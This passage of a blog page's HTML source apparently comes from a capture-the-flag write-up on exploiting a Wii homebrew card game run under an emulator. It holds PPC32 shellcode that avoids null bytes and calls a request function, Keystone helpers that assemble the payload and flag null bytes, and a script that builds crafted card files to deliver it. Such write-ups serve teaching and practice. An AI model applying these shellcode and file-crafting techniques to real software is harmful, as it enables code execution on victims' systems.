+<span class="line"><span style="color:#C98A7D">        ori   5, 5, 0x</span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">l16</span><span style="color:#666666">(</span><span style="color:#C99076">READ_BUFFER</span><span style="color:#666666">)</span><span style="color:#CB7676">:04x</span><span style="color:#C99076">}</span></span>
+<span class="line"><span style="color:#C98A7D">        xor   6, 6, 6        # clear r6</span></span>
+<span class="line"><span style="color:#C98A7D">        addi  6, 6, 0x101</span></span>
+<span class="line"><span style="color:#C98A7D">        andi.   6, 6, 0xfff0 # Avoid null bytes in</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#C98A7D">        xor   12, 12, 12        # clear r12</span></span>
+<span class="line"><span style="color:#C98A7D">        addis 12,12, 0x</span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">h16</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">make_request</span><span style="color:#666666">)</span><span style="color:#CB7676">^0x</span><span style="color:#4C9A91">0110</span><span style="color:#CB7676">:04x</span><span style="color:#C99076">}</span><span style="color:#C98A7D"> # We need is to not have null bytes</span></span>
+<span class="line"><span style="color:#C98A7D">        ori   12,12, 0x</span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">l16</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">make_request</span><span style="color:#666666">)</span><span style="color:#CB7676">:04x</span><span style="color:#C99076">}</span></span>
+<span class="line"><span style="color:#C98A7D">        xor   11, 11, 11        # clear r11</span></span>
+<span class="line"><span style="color:#C98A7D">        addis 11,11, 0x0110</span></span>
+<span class="line"><span style="color:#C98A7D">        xor   12, 11, 12  # r12 = make_request ^ 0x00100000</span></span>
+<span class="line"><span style="color:#C98A7D">        mtctr 12</span></span>
+<span class="line"><span style="color:#C98A7D">        bctrl</span></span>
+<span class="line"><span style="color:#C98A7D">    """</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> assemble</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">asm_source</span><span style="color:#666666">:</span><span style="color:#B8A965"> str</span><span style="color:#666666">)</span><span style="color:#666666"> -></span><span style="color:#B8A965"> bytes</span><span style="color:#666666">:</span></span>
+<span class="line"><span style="color:#C98A7D77">    """</span><span style="color:#C98A7D">Assemble the given PPC32 Big-Endian source to raw shellcode.</span><span style="color:#C98A7D77">"""</span></span>
+<span class="line"><span style="color:#DBD7CAEE">    ks </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> Ks</span><span style="color:#666666">(</span><span style="color:#C99076">KS_ARCH_PPC</span><span style="color:#666666">,</span><span style="color:#C99076"> KS_MODE_PPC32</span><span style="color:#CB7676"> |</span><span style="color:#C99076"> KS_MODE_BIG_ENDIAN</span><span style="color:#666666">)</span></span>
+<span class="line"><span style="color:#DBD7CAEE">    encoding</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> _ </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ks</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">asm</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">asm_source</span><span style="color:#666666">)</span></span>
+<span class="line"><span style="color:#4D9375">    return</span><span style="color:#B8A965"> bytes</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">encoding</span><span style="color:#666666">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> highlight_shellcode</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">data</span><span style="color:#666666">:</span><span style="color:#B8A965"> bytes</span><span style="color:#666666">)</span><span style="color:#666666"> -></span><span style="color:#B8A965"> str</span><span style="color:#666666">:</span></span>
+<span class="line"><span style="color:#C98A7D77">    """</span><span style="color:#C98A7D">Return a printable string with </span><span style="color:#C99076">\x00</span><span style="color:#C98A7D"> bytes rendered in red.</span><span style="color:#C98A7D77">"""</span></span>
+<span class="line"><span style="color:#DBD7CAEE">    out </span><span style="color:#666666">=</span><span style="color:#666666"> []</span></span>
+<span class="line"><span style="color:#4D9375">    for</span><span style="color:#DBD7CAEE"> b </span><span style="color:#4D9375">in</span><span style="color:#DBD7CAEE"> data</span><span style="color:#666666">:</span></span>
+<span class="line"><span style="color:#DBD7CAEE">        byte </span><span style="color:#666666">=</span><span style="color:#CB7676"> f</span><span style="color:#C98A7D">"</span><span style="color:#C99076">\\</span><span style="color:#C98A7D">x</span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">b</span><span style="color:#CB7676">:02x</span><span style="color:#C99076">}</span><span style="color:#C98A7D">"</span></span>
+<span class="line"><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> b </span><span style="color:#CB7676">==</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">:</span></span>
+<span class="line"><span style="color:#DBD7CAEE">            out</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#666666">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"</span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">Fore</span><span style="color:#666666">.</span><span style="color:#C99076">RED}{</span><span style="color:#DBD7CAEE">byte</span><span style="color:#C99076">}{</span><span style="color:#DBD7CAEE">Style</span><span style="color:#666666">.</span><span style="color:#C99076">RESET_ALL}</span><span style="color:#C98A7D">"</span><span style="color:#666666">)</span></span>
+<span class="line"><span style="color:#4D9375">        else</span><span style="color:#666666">:</span></span>
+<span class="line"><span style="color:#DBD7CAEE">            out</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">byte</span><span style="color:#666666">)</span></span>
+<span class="line"><span style="color:#4D9375">    return</span><span style="color:#C98A7D77"> ''</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">join</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">out</span><span style="color:#666666">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> instructions_causing_nulls</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">asm_source</span><span style="color:#666666">:</span><span style="color:#B8A965"> str</span><span style="color:#666666">)</span><span style="color:#666666"> -></span><span style="color:#DBD7CAEE"> list</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">tuple</span><span style="color:#666666">[</span><span style="color:#B8A965">str</span><span style="color:#666666">,</span><span style="color:#B8A965"> bytes</span><span style="color:#666666">]]:</span></span>
+<span class="line"><span style="color:#C98A7D77">    """</span></span>
+<span class="line"><span style="color:#C98A7D">    Re-assemble each individual instruction so we can tell</span></span>
+<span class="line"><span style="color:#C98A7D">    which of them produces a 0x00 byte.</span></span>
+<span class="line"><span style="color:#C98A7D77">    """</span></span>
+<span class="line"><span style="color:#DBD7CAEE">    ks </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> Ks</span><span style="color:#666666">(</span><span style="color:#C99076">KS_ARCH_PPC</span><span style="color:#666666">,</span><span style="color:#C99076"> KS_MODE_PPC32</span><span style="color:#CB7676"> |</span><span style="color:#C99076"> KS_MODE_BIG_ENDIAN</span><span style="color:#666666">)</span></span>
+<span class="line"><span style="color:#DBD7CAEE">    offenders </span><span style="color:#666666">=</span><span style="color:#666666"> []</span></span>
+<span class="line"><span style="color:#4D9375">    for</span><span style="color:#DBD7CAEE"> raw </span><span style="color:#4D9375">in</span><span style="color:#DBD7CAEE"> asm_source</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">splitlines</span><span style="color:#666666">():</span></span>
+<span class="line"><span style="color:#758575DD">        # strip comments and blank lines</span></span>
+<span class="line"><span style="color:#DBD7CAEE">        instr </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> raw</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">split</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">#</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">)[</span><span style="color:#4C9A91">0</span><span style="color:#666666">].</span><span style="color:#DBD7CAEE">strip</span><span style="color:#666666">()</span></span>
+<span class="line"><span style="color:#4D9375">        if</span><span style="color:#CB7676"> not</span><span style="color:#DBD7CAEE"> instr</span><span style="color:#666666">:</span></span>
+<span class="line"><span style="color:#4D9375">            continue</span></span>
+<span class="line"><span style="color:#DBD7CAEE">        enc</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> _ </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ks</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">asm</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">instr</span><span style="color:#666666">)</span></span>
+<span class="line"><span style="color:#DBD7CAEE">        encoded </span><span style="color:#666666">=</span><span style="color:#B8A965"> bytes</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">enc</span><span style="color:#666666">)</span></span>
+<span class="line"><span style="color:#4D9375">        if</span><span style="color:#4C9A91"> 0</span><span style="color:#CB7676"> in</span><span style="color:#DBD7CAEE"> encoded</span><span style="color:#666666">:</span></span>
+<span class="line"><span style="color:#DBD7CAEE">            offenders</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#666666">((</span><span style="color:#DBD7CAEE">instr</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> encoded</span><span style="color:#666666">))</span></span>
+<span class="line"><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> offenders</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#758575DD"># ---------- Main entry point ----------</span></span>
+<span class="line"><span style="color:#4D9375">if</span><span style="color:#B8A965"> __name__</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">__main__</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span></span>
+<span class="line"><span style="color:#DBD7CAEE">    colorama_init</span><span style="color:#666666">(</span><span style="color:#BD976A">autoreset</span><span style="color:#666666">=</span><span style="color:#4D9375">True</span><span style="color:#666666">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#DBD7CAEE">    shellcode  </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> assemble</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">asm_source</span><span style="color:#666666">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#758575DD">    # 1) Pretty print the final shellcode</span></span>
+<span class="line"><span style="color:#B8A965">    print</span><span style="color:#666666">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"shellcode length: </span><span style="color:#C99076">{</span><span style="color:#B8A965">len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">shellcode</span><span style="color:#666666">)</span><span style="color:#C99076">}</span><span style="color:#C98A7D"> bytes</span><span style="color:#C99076">\n</span><span style="color:#C98A7D">"</span><span style="color:#666666">)</span></span>
+<span class="line"><span style="color:#B8A965">    print</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">highlight_shellcode</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">shellcode</span><span style="color:#666666">),</span><span style="color:#C98A7D77"> "</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#758575DD">    # 2) Show which instructions contain nul bytes</span></span>
+<span class="line"><span style="color:#DBD7CAEE">    bad_instrs </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> instructions_causing_nulls</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">asm_source</span><span style="color:#666666">)</span></span>
+<span class="line"><span style="color:#4D9375">    if</span><span style="color:#DBD7CAEE"> bad_instrs</span><span style="color:#666666">:</span></span>
+<span class="line"><span style="color:#B8A965">        print</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Instructions containing </span><span style="color:#C99076">\\</span><span style="color:#C98A7D">x00 bytes:</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
+<span class="line"><span style="color:#4D9375">        for</span><span style="color:#DBD7CAEE"> instr</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> enc </span><span style="color:#4D9375">in</span><span style="color:#DBD7CAEE"> bad_instrs</span><span style="color:#666666">:</span></span>
+<span class="line"><span style="color:#DBD7CAEE">            hex_bytes </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D77"> '</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">join</span><span style="color:#666666">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"</span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">b</span><span style="color:#CB7676">:02x</span><span style="color:#C99076">}</span><span style="color:#C98A7D">"</span><span style="color:#4D9375"> for</span><span style="color:#DBD7CAEE"> b </span><span style="color:#4D9375">in</span><span style="color:#DBD7CAEE"> enc</span><span style="color:#666666">)</span></span>
+<span class="line"><span style="color:#B8A965">            print</span><span style="color:#666666">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"  </span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">instr</span><span style="color:#CB7676">:&#x3C;24</span><span style="color:#C99076">}</span><span style="color:#C98A7D"> →  </span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">hex_bytes</span><span style="color:#C99076">}</span><span style="color:#C98A7D">"</span><span style="color:#666666">)</span></span>
+<span class="line"><span style="color:#4D9375">    else</span><span style="color:#666666">:</span></span>
+<span class="line"><span style="color:#B8A965">        print</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Great news: no instruction introduced a null byte!</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
+<span class="line"></span></code></pre>
+<p>And to finally craft the two cards…</p>
+<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="py"><code><span class="line"><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> enum</span></span>
+<span class="line"><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> os</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#CB7676">class</span><span style="color:#5DA994"> CardType</span><span style="color:#666666">(</span><span style="color:#80A665">enum</span><span style="color:#666666">.</span><span style="color:#80A665">Enum</span><span style="color:#666666">):</span></span>
+<span class="line"><span style="color:#C99076">    MONSTER</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 0</span></span>
+<span class="line"><span style="color:#C99076">    SPELL</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 1</span></span>
+<span class="line"><span style="color:#C99076">    TRAP</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 2</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> p32</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">value</span><span style="color:#666666">:</span><span style="color:#B8A965"> int</span><span style="color:#666666">)</span><span style="color:#666666"> -></span><span style="color:#B8A965"> bytes</span><span style="color:#666666">:</span></span>
+<span class="line"><span style="color:#C98A7D77">    """</span><span style="color:#C98A7D">Convert an integer to a 4-byte big-endian representation.</span><span style="color:#C98A7D77">"""</span></span>
+<span class="line"><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> value</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">to_bytes</span><span style="color:#666666">(</span><span style="color:#4C9A91">4</span><span style="color:#666666">,</span><span style="color:#BD976A"> byteorder</span><span style="color:#666666">=</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">big</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#CB7676">class</span><span style="color:#5DA994"> Card</span><span style="color:#666666">:</span></span>
+<span class="line"><span style="color:#CB7676">    def</span><span style="color:#B8A965"> __init__</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">self</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> id</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> texture</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> card_type</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> name</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> description</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> attack</span><span style="color:#CB7676">=</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> defense</span><span style="color:#CB7676">=</span><span style="color:#4C9A91">0</span><span style="color:#666666">):</span></span>
+<span class="line"><span style="color:#C99076">        self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">id </span><span style="color:#666666">=</span><span style="color:#B8A965"> id</span></span>
+<span class="line"><span style="color:#C99076">        self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">texture </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> texture</span></span>
+<span class="line"><span style="color:#C99076">        self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">type </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> card_type</span></span>
+<span class="line"><span style="color:#C99076">        self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">name </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> name</span></span>
+<span class="line"><span style="color:#C99076">        self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">description </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> description</span></span>
+<span class="line"><span style="color:#C99076">        self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">attack </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> attack</span></span>
+<span class="line"><span style="color:#C99076">        self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">defense </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> defense</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#4D9375">        if</span><span style="color:#B8A965"> len</span><span style="color:#666666">(</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">name</span><span style="color:#666666">)</span><span style="color:#CB7676"> ></span><span style="color:#4C9A91"> 32</span><span style="color:#666666">:</span></span>
+<span class="line"><span style="color:#4D9375">            raise</span><span style="color:#B8A965"> ValueError</span><span style="color:#666666">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"Name '</span><span style="color:#C99076">{self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">name</span><span style="color:#C99076">}</span><span style="color:#C98A7D">' exceeds 32 characters."</span><span style="color:#666666">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#CB7676">    def</span><span style="color:#80A665"> serializeToBinary</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">self</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> output_path</span><span style="color:#666666">):</span></span>
+<span class="line"><span style="color:#758575DD">        # Magic</span></span>
+<span class="line"><span style="color:#DBD7CAEE">        magic </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">FTCARD</span><span style="color:#C98A7D77">"</span></span>
+<span class="line"><span style="color:#758575DD">        # Id</span></span>
+<span class="line"><span style="color:#B8A965">        id</span><span style="color:#666666"> =</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">id</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">to_bytes</span><span style="color:#666666">(</span><span style="color:#4C9A91">2</span><span style="color:#666666">,</span><span style="color:#BD976A"> byteorder</span><span style="color:#666666">=</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">big</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
+<span class="line"><span style="color:#758575DD">        # Size of the jpeg image content</span></span>
+<span class="line"><span style="color:#DBD7CAEE">        size </span><span style="color:#666666">=</span><span style="color:#B8A965"> len</span><span style="color:#666666">(</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">texture</span><span style="color:#666666">).</span><span style="color:#DBD7CAEE">to_bytes</span><span style="color:#666666">(</span><span style="color:#4C9A91">4</span><span style="color:#666666">,</span><span style="color:#BD976A"> byteorder</span><span style="color:#666666">=</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">big</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
+<span class="line"><span style="color:#758575DD">        # Card type number</span></span>
+<span class="line"><span style="color:#DBD7CAEE">        card_type </span><span style="color:#666666">=</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">type</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">value </span><span style="color:#4D9375">if</span><span style="color:#B8A965"> isinstance</span><span style="color:#666666">(</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">type</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> CardType</span><span style="color:#666666">)</span><span style="color:#4D9375"> else</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">type</span></span>
+<span class="line"><span style="color:#DBD7CAEE">        card_type </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> card_type</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">to_bytes</span><span style="color:#666666">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#BD976A"> byteorder</span><span style="color:#666666">=</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">big</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#BD976A"> signed</span><span style="color:#666666">=</span><span style="color:#4D9375">True</span><span style="color:#666666">)</span></span>
+<span class="line"><span style="color:#758575DD">        # Zero padding</span></span>
+<span class="line"><span style="color:#DBD7CAEE">        zero_padding </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\x00\x00\x00</span><span style="color:#C98A7D77">"</span></span>
+<span class="line"><span style="color:#758575DD">        # Attack value</span></span>
+<span class="line"><span style="color:#DBD7CAEE">        attack </span><span style="color:#666666">=</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">attack</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">to_bytes</span><span style="color:#666666">(</span><span style="color:#4C9A91">2</span><span style="color:#666666">,</span><span style="color:#BD976A"> byteorder</span><span style="color:#666666">=</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">big</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#BD976A"> signed</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#666666">)</span></span>
+<span class="line"><span style="color:#758575DD">        # Defense value</span></span>
+<span class="line"><span style="color:#DBD7CAEE">        defense </span><span style="color:#666666">=</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">defense</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">to_bytes</span><span style="color:#666666">(</span><span style="color:#4C9A91">2</span><span style="color:#666666">,</span><span style="color:#BD976A"> byteorder</span><span style="color:#666666">=</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">big</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#BD976A"> signed</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#666666">)</span></span>
+<span class="line"><span style="color:#758575DD">        # Name</span></span>
+<span class="line"><span style="color:#DBD7CAEE">        name </span><span style="color:#666666">=</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">name</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">utf-8</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span><span style="color:#CB7676"> +</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span></span>
+<span class="line"><span style="color:#758575DD">        # Description</span></span>
+<span class="line"><span style="color:#DBD7CAEE">        description </span><span style="color:#666666">=</span><span style="color:#666666"> (</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">description </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span><span style="color:#4D9375"> if</span><span style="color:#B8A965"> isinstance</span><span style="color:#666666">(</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">description</span><span style="color:#666666">,</span><span style="color:#B8A965"> bytes</span><span style="color:#666666">)</span><span style="color:#4D9375"> else</span><span style="color:#666666"> (</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">description</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">utf-8</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span><span style="color:#CB7676"> +</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
+<span class="line"><span style="color:#DBD7CAEE">        </span></span>
+<span class="line"><span style="color:#758575DD">        # Offset of jpeg image in the file</span></span>
+<span class="line"><span style="color:#DBD7CAEE">        offset </span><span style="color:#666666">=</span><span style="color:#666666"> (</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">18</span><span style="color:#CB7676"> +</span><span style="color:#B8A965"> len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">name</span><span style="color:#666666">)</span><span style="color:#CB7676"> +</span><span style="color:#B8A965"> len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">description</span><span style="color:#666666">)).</span><span style="color:#DBD7CAEE">to_bytes</span><span style="color:#666666">(</span><span style="color:#4C9A91">4</span><span style="color:#666666">,</span><span style="color:#BD976A"> byteorder</span><span style="color:#666666">=</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">big</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#DBD7CAEE">        file_contents </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> magic </span><span style="color:#CB7676">+</span><span style="color:#B8A965"> id</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> size </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> offset </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> card_type </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> zero_padding </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> attack </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> defense </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> name </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> description </span><span style="color:#CB7676">+</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">texture</span></span>
+<span class="line"><span style="color:#DBD7CAEE">        </span></span>
+<span class="line"><span style="color:#4D9375">        with</span><span style="color:#B8A965"> open</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">output_path</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">wb</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span><span style="color:#4D9375"> as</span><span style="color:#DBD7CAEE"> f</span><span style="color:#666666">:</span></span>
+<span class="line"><span style="color:#DBD7CAEE">            f</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">write</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">file_contents</span><span style="color:#666666">)</span></span>
+<span class="line"><span style="color:#B8A965">            print</span><span style="color:#666666">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"Saved: </span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">output_path</span><span style="color:#C99076">}</span><span style="color:#C98A7D">"</span><span style="color:#666666">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#758575DD"># Random images to use as card textures for completeness</span></span>
+<span class="line"><span style="color:#DBD7CAEE">graphics_source1 </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">/home/frank01001/Pictures/Misc/bus.jpg</span><span style="color:#C98A7D77">"</span></span>
+<span class="line"><span style="color:#DBD7CAEE">graphics_source2 </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">/home/frank01001/Pictures/Misc/giarre.jpg</span><span style="color:#C98A7D77">"</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#758575DD"># I directly load them in my SD card sync folder</span></span>
+<span class="line"><span style="color:#DBD7CAEE">out_path </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">/home/frank01001/.var/app/org.DolphinEmu.dolphin-emu/data/dolphin-emu/Load/WiiSDSync/apps/forsaken_tower/content/</span><span style="color:#C98A7D77">"</span></span>
+<span class="line"></span>
